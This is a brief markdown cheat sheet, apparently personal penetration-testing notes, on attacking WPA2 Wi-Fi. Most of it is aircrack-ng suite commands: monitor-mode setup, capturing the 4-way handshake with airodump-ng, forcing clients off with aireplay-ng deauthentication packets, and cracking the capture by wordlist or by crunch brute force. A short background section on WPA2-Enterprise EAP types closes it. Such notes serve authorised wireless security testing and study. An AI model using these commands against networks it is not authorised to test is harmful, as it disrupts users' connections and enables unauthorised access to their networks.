### general information
```
4 way handshake for authentiation
every user get single session (Pairwise Transient key - PTK, calculated from Pairwise Master Key - PMK)
replay protected
```

### capture hanshake
```
airmon-ng check
airmon-ng check kill
airmon-ng start <interface>
airodump-ng <interface> --bssid <bssid> --channel <channel> --write <file>
```

### if there are some problems starting the interface you can try
```
rfkill unblock all
```

### send deauthenticate packets
```
aireplay-ng --deauth 5 -a <bssid> <interface>
```
 
### crack captured handshake using wordlist
```
aircrack-ng <file>.cap -w <wordlist>
```

### bruteforce captured handshake
```
crunch 8 10 [a-z;A-Z;0-9] | aircrack-ng <file>.cap -b <bssid> -w-
```
 
### general information about WPA2-Enterprise
```
No global key
Radius server used for authentication
```

### EAP-Types (without outer tunnel):
```
EAP-MD5
EAP-LEAP
```

### EAP-Types (with outer tunnel):
```
EAP-FAST
PEAP
EAP-TLS
```

